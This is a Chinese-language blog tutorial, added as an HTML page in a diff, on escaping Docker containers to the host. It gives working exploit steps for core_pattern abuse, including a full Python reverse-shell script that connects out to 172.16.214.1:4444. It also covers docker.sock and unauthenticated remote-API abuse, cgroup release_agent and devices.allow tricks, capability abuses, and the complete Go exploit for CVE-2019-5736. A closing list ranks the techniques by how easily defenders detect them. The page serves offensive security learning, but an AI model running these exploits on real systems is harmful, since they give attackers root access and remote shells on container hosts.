@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Docker面临的风险 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Docker\u9762\u4e34\u7684\u98ce\u9669", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u6211\u662f\u5426\u5728Docker\u4e2d\uff1f", url: "#docker_1" },
+              {title: "\u9003\u9038", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Prometheus/Prometheus/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Prometheus/Prometheus/" class="btn btn-xs btn-link">
+        Prometheus
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Azure/Azure/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Azure/Azure/" class="btn btn-xs btn-link">
+        Azure
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="docker">Docker面临的风险</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#我是否在Docker中">我是否在Docker中？</a></li>
+<li><a href="#逃逸">逃逸</a><ul>
+<li><a href="#挂载宿主机procfs逃逸">挂载宿主机procfs逃逸</a><ul>
+<li><a href="#利用">利用</a></li>
+</ul>
+</li>
+<li><a href="#利用dockersock造成逃逸">利用docker.sock造成逃逸</a><ul>
+<li><a href="#利用">利用</a></li>
+</ul>
+</li>
+<li><a href="#远程API未授权造成逃逸">远程API未授权造成逃逸</a><ul>
+<li><a href="#利用">利用</a></li>
+</ul>
+</li>
+<li><a href="#内核漏洞">内核漏洞</a></li>
+<li><a href="#利用lxcfs">利用lxcfs</a><ul>
+<li><a href="#利用">利用</a></li>
+</ul>
+</li>
+<li><a href="#privileged参数特权容器逃逸">privileged参数特权容器逃逸</a><ul>
+<li><a href="#利用目录挂载">利用:目录挂载</a></li>
+<li><a href="#利用notify_on_release">利用:notify_on_release</a></li>
+<li><a href="#利用重写devicesallow">利用：重写devices.allow</a></li>
+</ul>
+</li>
+<li><a href="#SYS_PTRACE-权限逃逸">SYS_PTRACE 权限逃逸</a></li>
+<li><a href="#cap_sys_module-权限逃逸">cap_sys_module 权限逃逸</a></li>
+<li><a href="#docker-runc-逃逸-CVE-2019-5736">docker runc 逃逸 CVE-2019-5736</a><ul>
+<li><a href="#原理">原理</a></li>
+<li><a href="#利用">利用</a></li>
+</ul>
+</li>
+<li><a href="#逃逸总结">逃逸总结</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="docker_1">我是否在Docker中？</h2>
+<ol>
+<li>检查/.dockerenv文件是否存在；</li>
+<li>检查/proc/1/cgroup内是否包含"docker"等字符串；</li>
+<li>检查是否存在container环境变量。</li>
+</ol>
+<h2 id="_2">逃逸</h2>
+<p>从Docker逃逸到宿主机</p>
+<h3 id="procfs">挂载宿主机procfs逃逸</h3>
+<p>procfs系统说白了就是/proc目录，它是一个伪文件系统，用于反映各个进程的状态等信息。</p>
+<p>当主机崩溃时，/proc/sys/kernel/core_pattern 会将崩溃时内存转储数据进行导出。</p>
+<p>自2.6.19内核版本开始，支持了新语法，我们可以往/proc/sys/kernel/core_pattern文件末尾添加管道符|然后写入命令，当主机崩溃时便会执行管道符后面的命令。</p>
+<p>如果宿主机的procfs系统挂载到了docker里面，那么我们就可以对宿主机的/proc/sys/kernel/core_pattern任意写入，写入恶意命令后再想办法引起报错崩溃，这样宿主机便会执行我们写入到core_pattern里面的命令了。</p>
+<p>环境搭建：把宿主机/proc挂载到docker /host/proc</p>
+<pre><code class="language-text">docker run -it --rm --mount type=bind,source=/proc,target=/host/proc kpli0rn/ubuntu:18.04 bash
+</code></pre>
+<p>怎么检测？遍历所有文件，如果有两个及以上core_pattern文件出现就很可疑了。</p>
+<pre><code class="language-text">find / -name core_pattern
+
+</code></pre>
+<p><img alt="" src="../image/image_eKT2_oL9Xu.png" /></p>
+<h4 id="_3">利用</h4>
+<p>找到当前docker在宿主机下的路径</p>
+<pre><code class="language-text">`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+</code></pre>
+<p><img alt="" src="../image/image_52sp3AgVK9.png" /></p>
+<p>安装vim和gcc分别用于编辑exp和编译造成崩溃的C文件</p>
+<p>vim /tmp/.exp.py</p>
+<pre><code class="language-text">#!/usr/bin/python3
+import  os
+import pty
+import socket
+lhost = &quot;172.16.214.1&quot;
+lport = 4444
+def main():
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((lhost, lport))
+   os.dup2(s.fileno(), 0)
+   os.dup2(s.fileno(), 1)
+   os.dup2(s.fileno(), 2)
+   os.putenv(&quot;HISTFILE&quot;, '/dev/null')
+   pty.spawn(&quot;/bin/bash&quot;)
+   # os.remove('/tmp/.t.py')
+   s.close()
+if __name__ == &quot;__main__&quot;:
+   main()
+
+</code></pre>
+<p>然后给python文件加上可执行权限</p>
+<pre><code class="language-text">chmod 777 /tmp/.exp.py
+</code></pre>
+<p>向挂载的core_pattern末尾写入exp路径</p>
+<pre><code class="language-text">echo -e &quot;|/var/lib/docker/overlay2/20c27c85c2556a753bb6e9afc68dc82a3ab4d96e4acc8adf443491d1cf0bd526/diff/tmp/.exp.py /r core&quot; &gt; /host/proc/sys/kernel/core_pattern
+</code></pre>
+<p>运行一个造成崩溃的c程序</p>
+<pre><code class="language-text">vim t.c
+#include&lt;stdio.h&gt;
+int main(void)  {
+   int *a  = NULL;
+   *a = 1;
+   return 0;
+}
+gcc t.c -o t
+./t
+</code></pre>
+<p>就会收获宿主机弹回来的shell</p>
+<h3 id="dockersock">利用docker.sock造成逃逸</h3>
+<p>Docker Socket 用于宿主机与docker容器通信（查询信息、下发命令等）
+也就是说我们执行docker指令时，是通过Docker Socket作为中间人转发的。</p>
+<p><img alt="" src="../image/image_zuSkQgJZdp.png" /></p>
+<p>如果容器里挂载了宿主机的docker.sock文件，那么就相当于我们拿到了宿主机的docker指令执行权，可以在宿主机上执行任意docker指令。只需我们直接创建一个特权容器就能轻松逃逸。</p>
+<p>环境搭建</p>
+<pre><code class="language-text">docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock  kpli0rn/ubuntu:18.04
+docker exec -it with_docker_sock /bin/bash
+
+</code></pre>
+<p>安装docker命令行</p>
+<pre><code class="language-text">apt-get update
+apt-get install curl
+curl -fsSL https://get.docker.com/ | sh
+</code></pre>
+<p>检测：查看有没有叫docker.sock的文件</p>
+<p><img alt="" src="../image/image_zlYSYn05F8.png" /></p>
+<h4 id="_4">利用</h4>
+<p>把宿主机根目录挂载到新容器的/host目录下。并进入新容器的shell里</p>
+<pre><code class="language-text">docker run -it -v /:/host ubuntu /bin/bash
+
+</code></pre>
+<p><img alt="" src="../image/image_V1ZybMcKOB.png" /></p>
+<p>定时任务啥的弹个shell回来就逃逸了</p>
+<h3 id="api">远程API未授权造成逃逸</h3>
+<p>docker remote api 可以直接通过http请求执行 docker 命令。
+如果这个api开放在了公网，那么我们就可以直接利用这个api操作docker。</p>
+<p>环境搭建</p>
+<pre><code class="language-text">systemctl stop docker //先把docker关了
+dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375 //这个端口并不一定是2375，根据实际情况判断
+</code></pre>
+<p>出现404则说明存在未授权</p>
+<p><img alt="" src="../image/image_Jhl_lpQIQv.png" /></p>
+<h4 id="_5">利用</h4>
+<pre><code class="language-text">列出容器信息
+curl http://&lt;target&gt;:2375/containers/json
+
+查看容器
+docker -H tcp://&lt;target&gt;:2375 ps -a
+
+新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。
+docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash
+
+
+</code></pre>
+<p><img alt="" src="../image/image_g9kwAE4kve.png" /></p>
+<p><img alt="" src="../image/image_Ki7R_fuixE.png" /></p>
+<h3 id="_6">内核漏洞</h3>
+<p>用exp硬造就完事了</p>
+<h3 id="lxcfs">利用lxcfs</h3>
+<p>lxcfs 是linux下一个用于虚拟化容器的工具。</p>
+<p>在默认情况下容器会挂在宿主机上的/proc目录,其包含如：meminfo, cpuinfo，stat， uptime等资源信息，可能会带来一些不必要的错误或者不便。</p>
+<p>而lxcfs为容器提供了下列procfs文件,比如把宿主机的 /var/lib/lxcfs/proc/memoinfo 文件挂载到Docker容器的/proc/meminfo位置后，容器读取相应内容时会通过lxcfs获取正确的约束设定，实现容器内/proc与物理机隔离。</p>
+<pre><code class="language-text">/proc/cpuinfo
+/proc/diskstats
+/proc/meminfo
+/proc/stat
+/proc/swaps
+/proc/uptime
+</code></pre>
+<p>环境搭建：</p>
+<pre><code class="language-text">apt install lxcfs
+或者
+git clone https://github.com/lxc/lxcfs.git
+
+lxcfs /var/lib/lxcfs
+docker run -it -v /var/lib/lxcfs/:/test/:rw kpli0rn/ubuntu:18.04 /bin/bash
+
+</code></pre>
+<p>此时容器里的/test目录会有这些文件（挂载自宿主机）</p>
+<p><img alt="" src="../image/image_sVkuEphMP-.png" /></p>
+<p>检测：是否启用了lxcfs</p>
+<pre><code class="language-text">cat /proc/1/mountinfo | grep lxcfs
+
+</code></pre>
+<p><img alt="" src="../image/image_-Ri22SbG21.png" /></p>
+<h4 id="_7">利用</h4>
+<p>无奈环境搭不上，就简单说说咋利用的吧<a href="https://www.ai2news.com/blog/1441724/" title="https://www.ai2news.com/blog/1441724/">https://www.ai2news.com/blog/1441724/</a></p>
+<p>首先因为lxcfs/cgroup被挂载进了容器，并且容器对挂在进来的lxcfs/cgroup有读写权，那么可以先修改当前已控制容器对应的devices.allow为a来设置容器允许访问所有类型设备</p>
+<pre><code class="language-text">echo a &gt; /test/lxcfs/cgroup/devices/docker/some_id/devices.allow
+</code></pre>
+<p>又因为/etc/host是默认挂载进容器的，我们可以通过如下命令拿到宿主机设备对应的ID号</p>
+<pre><code class="language-text">cat /proc/self/mountinfo |grep etc
+
+</code></pre>
+<p><img alt="" src="../image/image_myXT1vprWR.png" /></p>
+<p>然后使用如下指令，配合刚刚拿到的宿主机对应的id号，就能读写宿主机文件了</p>
+<pre><code class="language-text">mknod test b 252 1   //创建基于宿主机的块设备
+debugfs -w test   //对刚刚创建的块设备进行调试，也就是能进入宿主机文件系统了
+</code></pre>
+<p>这个利用方式 并不只对lxcfs有效，如果我们能读写cgroup文件，理论上都能这么逃逸</p>
+<h3 id="privileged">privileged参数特权容器逃逸</h3>
+<pre><code class="language-text">环境搭建
+docker run --rm --privileged=true -it kpli0rn/ubuntu:18.04
+
+</code></pre>
+<p>然后我们就进入了特权容器内部。</p>
+<p>它有如下特权</p>
+<ol>
+<li>禁用Seccomp和AppArmor等安全机制</li>
+<li>Capabilities加满</li>
+</ol>
+<p>那么怎么查看当前容器是否是特权容器呢？我们可以查看当前容器init进程（/proc/1）的capabilities属性中是否启用了 capability sets 来判断。</p>
+<p>capability sets 默认是不启动的，而特权容器的init进程会启用。</p>
+<p>我们可以用如下指令来检测capability sets 是否在init启用从而判断是否是高权限容器</p>
+<pre><code class="language-text">cat /proc/1/status | grep Cap
+
+</code></pre>
+<p><img alt="" src="../image/image_3ltEd9f1-q.png" /></p>
+<p>上图便是特权容器指令执行的结果。</p>
+<p><img alt="" src="../image/image_HxfeNp-nfR.png" /></p>
+<h4 id="_8">利用:目录挂载</h4>
+<p>通过fdisk指令查看挂载磁盘的情况</p>
+<p><img alt="" src="../image/image_dY6L8wuSrk.png" /></p>
+<p>可以发现我们可以宿主机的磁盘在docker内部显示为文件 /dev/vda1.
+我们可以将其挂载到我们docker内部的磁盘中去</p>
+<p><img alt="" src="../image/image__DCbabYt-J.png" /></p>
+<p>然后我们就可以向挂载进来的宿主磁盘中写入定时任务来反弹shell了</p>
+<h4 id="notify_on_release">利用:notify_on_release</h4>
+<p><strong>Cgroup</strong></p>
+<p>需要先了解一下linux下的cgroup机制</p>
+<p>cgroup机制是2.6内核由google公司主导引入的，用于实现linux内核资源虚拟化。docker所用到的资源隔离技术便是cgroup。</p>
+<p>cgroup有四个比较重要的概念：</p>
+<ul>
+<li>子系统：一个子系统就是一个资源的控制器，比如CPU子系统就是控制CPU的一个控制器。</li>
+<li>层级：一个子系统必须要附加（attach）到一个层级上才能起作用。使用<code>mkdir -p /cgroup/name &amp;&amp; mount -t cgroup -o subsystems name /cgroup/name</code>命令创建一个层级，并把该层级挂载到目录。</li>
+<li>控制组群：进程可以加入到某个控制组群，也可以迁移到另一个控制组群。控制组指明了内部资源的配额限制，即上限。</li>
+<li>任务：一个任务对应着系统的一个进程。控制组群所对应的目录中有一个<code>tasks</code>文件，将进程ID写进该文件，该进程就会受到该控制组群的限制。</li>
+</ul>
+<p>Cgroup有几个重要的文件</p>
+<p>/sys/fs/cgroup 有所有子系统的信息</p>
+<p><img alt="" src="../image/image_5TIdIPiwSV.png" /></p>
+<pre><code class="language-text">/sys/fs/cgroup/&lt;subsystem_name&gt;/cgroup.procs 记录该子系统任务进程PID
+
+/sys/fs/cgroup/&lt;subsystem_name&gt;/tasks 约等于cgroup.procs
+
+/sys/fs/cgroup/&lt;subsystem_name&gt;/notify_on_release 只有0或1两个值
+当为1时，cgroup下所有任务结束后，内核就会以root权限运行/sys/fs/cgroup/&lt;subsystem_name&gt;/release_agent 文件中对应路径的文件
+
+</code></pre>
+<p><strong>notify_on_release机制逃逸</strong></p>
+<p>通过上面对Cgroup的叙述，可以发现notify_on_release 这个文件很特殊，当它为1时，在cgroup结束所有任务后内核会以root权限运行<strong>release_agent文件中</strong>的对应路径的文件。</p>
+<p>所以如果我们对cgroup可编辑，且获得了当前容器在宿主机中的绝对路径，且拥有cap_sys_admin权限那么就可以完成逃逸。</p>
+<p>具体做法为，新建一个子cgroup，将其notify_on_release 设为1，<strong>release_agent</strong>文件中的路径设为容器中的恶意脚本文件在宿主机的绝对路径。然后清空cgroup.procs或tasks 文件，使恶意脚本文件被宿主机以root权限运行。</p>
+<p>环境搭建：</p>
+<p>--security-opt apparmor=unconfined 是关闭内核安全模块参数，这个模块如果打开有可能会导致逃逸失败</p>
+<pre><code class="language-text">docker run -it --cap-add='SYS_ADMIN' --security-opt apparmor=unconfined kpli0rn/ubuntu:18.04 bash
+</code></pre>
+<p>检测：</p>
+<pre><code class="language-text">cat /proc/1/status | grep Cap
+
+</code></pre>
+<p><img alt="" src="../image/image_iqJ8dUei5Y.png" /></p>
+<p><img alt="" src="../image/image_zT2hch-orn.png" /></p>
+<p>创建子cgroup并修改notify_on_release&#x20;</p>
+<pre><code class="language-text">mkdir /tmp/aa &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/aa &amp;&amp;echo 1 &gt; /tmp/aa/notify_on_release
+</code></pre>
+<p>获取在宿主机的绝对路径</p>
+<pre><code class="language-text">sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
+</code></pre>
+<p>然后写入子cgroup的release_agent文件，指向一个恶意的脚本文件，并给予可执行权</p>
+<pre><code class="language-text">echo '#!/bin/sh' &gt; /tmp/exp
+echo &quot;mkdir /hack_in&quot; &gt; /tmp/exp
+d=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo $d/tmp/exp &gt; /tmp/aa/release_agent
+chmod 777 /tmp/exp
+</code></pre>
+<p>然后清空子cgroup目录下的cgroup.procs或tasks文件</p>
+<pre><code class="language-text">sh -c &quot;echo \$\$ &gt; /tmp/aa/cgroup.procs&quot;
+</code></pre>
+<p>检测POC</p>
+<pre><code class="language-text">#!/bin/bash
+
+set -uex
+
+mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
+
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent
+
+echo '#!/bin/sh' &gt; /cmd
+echo &quot;ps aux &gt; $host_path/output&quot; &gt;&gt; /cmd
+chmod a+x /cmd
+
+sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;
+
+sleep 2
+cat &quot;/output&quot;
+</code></pre>
+<h4 id="devicesallow">利用：重写devices.allow</h4>
+<p>也就是刚刚提到了lxcfs里用到的方法。只不过我们需要手动把cgroup/devices挂载进来</p>
+<pre><code class="language-text">mkdir /tmp/dev
+
+mount -t cgroup -o devices devices /tmp/dev/
+</code></pre>
+<p>然后便是修改devices.allow</p>
+<p><img alt="" src="../image/image_HdNZXkKL7r.png" /></p>
+<p>然后便是找宿主机node号，并debugfs调试</p>
+<p><img alt="" src="../image/image_ea3nVbGfUQ.png" /></p>
+<h3 id="sys_ptrace">SYS_PTRACE 权限逃逸</h3>
+<p>SYS_PTRACE是启动docker容器时附加的一个权限参数，它起到一个调试器的作用。以高权限参数启动时默认带有该权限。</p>
+<blockquote>
+<p>docker --cap-add=SYS_PTRACE 或 Kubernetes PODS 设置 securityContext.capabilities 为 SYS_PTRACE 配置等把 SYS_PTRACE capabilities权限赋予容器的情况，都可能导致容器逃逸。
+...........
+这个场景很常见，因为无论是不是线上环境，业务进行灾难重试和程序调试都是没办法避免的，所以容器经常被设置 ptrace 权限。
+————腾讯蓝军</p>
+</blockquote>
+<p>因为有调试器权限，那么就意味着我们可以对其他进程进行调试，同时也就意味着可以对其他进程进行进程注入。</p>
+<p>但是由于namespace的存在造成了进程隔离，无法直接访问到宿主机进程pid，因此在容器启动时需要附加--pid=host打破进程隔离</p>
+<p>同时apparmor也可能会对此造成一定影响，实验时可以将其关闭</p>
+<p>环境搭建</p>
+<pre><code class="language-text">docker run --pid=host --cap-add=SYS_PTRACE --rm -it kpli0rn/ubuntu:18.04
+</code></pre>
+<p>检测</p>
+<p><img alt="" src="../image/image_jeX8Fm_6n3.png" /></p>
+<p><img alt="" src="../image/image_GEw3HDouVw.png" /></p>
+<p>然后用ps指令找到宿主机进程PID</p>
+<pre><code class="language-text">ps auxx | grep root
+
+</code></pre>
+<p><img alt="" src="../image/image_DQFWDZcmoK.png" /></p>
+<p>然后使用exp进行进程注入：<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" title="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
+<p>需要自己编译并且修改此处的payload。改成msf或者cs的都行</p>
+<p><img alt="" src="../image/image_b0EPDwshGm.png" /></p>
+<h3 id="cap_sys_module"><strong>cap_sys_module</strong> 权限逃逸</h3>
+<p>这个特权表示能够加载内核模块，那么我们只需要构造一个执行恶意命令的内核模块给容器加载就行了。原理就是这样。</p>
+<p>环境搭建</p>
+<pre><code class="language-text">docker run --cap-add=SYS_MODULE --rm -it kpli0rn/ubuntu:18.04
+
+</code></pre>
+<p>具体复现：<a href="https://blog.jus4fun.xyz/article/109/" title="https://blog.jus4fun.xyz/article/109/">https://blog.jus4fun.xyz/article/109/</a></p>
+<h3 id="docker-runc-cve-2019-5736">docker runc 逃逸 CVE-2019-5736</h3>
+<p>ref:<a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/" title="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/</a> 推荐阅读</p>
+<p>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6</p>
+<p>环境搭建,ubuntu下用metarget，官方推荐版本为Ubuntu 16.04 or <strong>18.04</strong></p>
+<pre><code class="language-text">metarget cnv install cve-2019-5736
+</code></pre>
+<p>或者脚本</p>
+<pre><code class="language-text">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh
+</code></pre>
+<h4 id="_9">原理</h4>
+<p>runc是Docker的容器运行时，负责Dokcer容器的容器生成和运行，举个例子 docker run -it ubuntu bash  容器的bash交互界面就是由runc启动的。runc一般在宿主机上以root权限跑着。
+同时在linux中存在/proc/pid/exe 这个东西，指向某进程的源程序，如果是/proc/self/exe 就是指向当前进程的源程序。
+我们可以通过劫持，将容器的bash内容更改为#!/proc/self/exe，即指向当前进程源程序，这样下次执行容器docker run -it ubuntu bash时就会执行runc本身。
+runc在容器中是可以被找到的，如果我们修改了runc文件本身的内容，如修改为反弹shell，那么下次执行docker run -it ubuntu bash时就会自动反弹一个shell回来。</p>
+<h4 id="_10">利用</h4>
+<p>exp：<a href="https://github.com/Frichetten/CVE-2019-5736-PoC" title="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p>注释引用自<a href="https://ble55ing.github.io/2020/03/19/docker-20195736/" title="https://ble55ing.github.io/2020/03/19/docker-20195736/">https://ble55ing.github.io/2020/03/19/docker-20195736/</a></p>
+<pre><code class="language-text">package main
+
+// Implementation of CVE-2019-5736
+// Created with help from @singe, @_cablethief, and @feexd.
+// This commit also helped a ton to understand the vuln
+// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
+import (
+  &quot;fmt&quot;
+  &quot;io/ioutil&quot;
+  &quot;os&quot;
+  &quot;strconv&quot;
+  &quot;strings&quot;
+)
+
+// This is the line of shell commands that will execute on the host
+var payload = &quot;#!/bin/bash \n mkdir /hack_in &amp;\n&quot;
+
+func main() {
+  //首先来看看能不能打开/bin/sh，即有root权限就成
+  fd, err := os.Create(&quot;/bin/sh&quot;)
+  if err != nil {
+    fmt.Println(err)
+    return
+  }
+
+    //然后将其覆盖为#!/proc/self/exe
+  fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)
+  err = fd.Close()
+  if err != nil {
+    fmt.Println(err)
+    return
+  }
+  fmt.Println(&quot;[+] Overwritten /bin/sh successfully&quot;)
+
+  // 循环遍历/proc里的文件，直到找到runc是哪个进程
+  var found int
+  for found == 0 {
+    pids, err := ioutil.ReadDir(&quot;/proc&quot;)
+    if err != nil {
+      fmt.Println(err)
+      return
+    }
+    for _, f := range pids {
+      fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;)
+      fstring := string(fbytes)
+      if strings.Contains(fstring, &quot;runc&quot;) {
+        fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())
+        found, err = strconv.Atoi(f.Name())
+        if err != nil {
+          fmt.Println(err)
+          return
+        }
+      }
+    }
+  }
+
+  // 循环去读这个/proc/pid/exe，先拿到一个该文件的fd，该fd就指向了runc程序的位置
+  var handleFd = -1
+  for handleFd == -1 {
+    // Note, you do not need to use the O_PATH flag for the exploit to work.
+    handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777)
+    if int(handle.Fd()) &gt; 0 {
+      handleFd = int(handle.Fd())
+    }
+  }
+  fmt.Println(&quot;[+] Successfully got the file handle&quot;)
+
+  // 然后不断的去尝试写这个指向的文件，一开始由于runc会先占用着，写不进去，直到runc的占用解除了，就立即
+  for {
+    writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
+    if int(writeHandle.Fd()) &gt; 0 {
+      fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)
+      writeHandle.Write([]byte(payload))
+      return
+    }
+  }
+}
+</code></pre>
+<p>用go打包</p>
+<pre><code class="language-text">go build a.go
+</code></pre>
+<p>模拟黑客把二进制文件传上去，并给予可执行权</p>
+<pre><code class="language-text">docker cp ./a 1f615cc4c464:/tmp
+chmod 777 /tmp/a
+</code></pre>
+<p>执行exp</p>
+<p><img alt="" src="../image/image_tr5MpSRmJs.png" /></p>
+<p>然后切个窗口，再执行一下docker exec -it 1f615cc4c464 /bin/sh</p>
+<p>可以发现恶意指令（向根目录写入hack_in文件夹）被成功执行</p>
+<p>（这里我换了个环境）</p>
+<p><img alt="" src="../image/image_dHX2bwgw7O.png" /></p>
+<h3 id="_11">逃逸总结</h3>
+<p>引用自腾讯蓝军：</p>
+<p>以目标“获取宿主机上的配置文件”为例，以下几种逃逸手法在容易在防御团队中暴露的概率从大到小，排序如下(部分典型手法举例，不同的EDR情况不同)：</p>
+<ol>
+<li>mount /etc + write crontab &#x20;</li>
+<li>mount /root/.ssh + write authorized_keys</li>
+<li>old CVE/vulnerability exploit</li>
+<li>write cgroup notify_on_release</li>
+<li>write procfs core_pattern</li>
+<li>volumeMounts: / + chroot</li>
+<li>remount and rewrite cgroup</li>
+<li>create ptrace cap container &#x20;</li>
+<li>websocket/sock shell + volumeMounts: /path</li>
+</ol>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Prometheus/Prometheus/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Prometheus/Prometheus/" class="btn btn-xs btn-link">
+        Prometheus
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Azure/Azure/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Azure/Azure/" class="btn btn-xs btn-link">
+        Azure
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
